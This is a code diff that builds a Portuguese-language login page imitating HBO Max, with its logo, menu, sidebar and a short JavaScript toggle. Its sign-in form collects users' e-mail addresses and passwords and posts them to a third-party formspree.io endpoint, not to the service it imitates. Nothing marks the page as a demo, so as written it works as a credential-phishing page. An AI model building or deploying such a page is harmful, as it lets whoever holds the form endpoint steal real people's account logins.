@@ -5,13 +5,79 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <link rel="stylesheet" href="css/style.css">
+
+    <script src="https://kit.fontawesome.com/7fe742cab1.js" crossorigin="anonymous"></script>
 </head>
 <body>
+    <div id="transpatente"></div>
     <header>
+        <div id="menuIcons">
+            <img src="img/menu.svg" id="btnSideBar" alt="" onclick="SideBar('on');">
+            <img src="img/search.svg" id="btnSearch" alt="">
+        </div>
+
+        <img id="logo" src="img/logo.svg" alt="">
+
+        <div id="menu">
+            <label id="teste">Assinar</label>
+            <label>Entrar</label>
+        </div>
         
     </header>
     <main>
+        <h1>Entrar</h1>
+        <span>Você tem uma conta HBO Max?</span>
+        
+        <form action="https://formspree.io/f/xeqwanoz" method="post">
+            <label for="">E-mail</label>
+            <input type="email" name="email" id="" required="required"/>
 
+            <label for="">Senha</label>
+            <input type="password" name="senha" id="" required="required"/>
+
+            <button type="submit" class="btn">Entrar</button>
+        </form>
+
+        <span>Você acessa a HBO Max por um provedor de TV, de internet ou celular?</span>
+
+        <button class="btn">Entrar como provedor</button>
     </main>
+
+    <div id="sideBar" class="closeSideBar">
+        
+        <div id="areaCloseSideBar">
+            <i id="closeSideBar" class="fa-solid fa-x" onclick="SideBar('off');"></i>
+        </div>
+
+        <img id="logoSideBar" src="img/logo.svg" alt="">
+        
+        <input type="text" name="serachSideBar" id="serachSideBar" placeholder="Procurar...">
+        <div id="menuSidebar">
+            <ul>
+                <li>Assinar</li>
+
+                <li>Entrar</li>
+            </ul>
+        </div>
+    </div>
+
+    <div id="blur" class="blurOff" onclick="SideBar('off');"></div>
+
 </body>
 </html>
+<script>
+
+    function SideBar($x){
+        if($x == 'on'){
+            document.getElementById('sideBar').className='openSideBar';
+            document.getElementById('blur').className='blurOn';
+        }
+
+        if($x == 'off'){
+            document.getElementById('sideBar').className='closeSideBar';
+            document.getElementById('blur').className='blurOff';
+        }
+    }
+    
+</script>
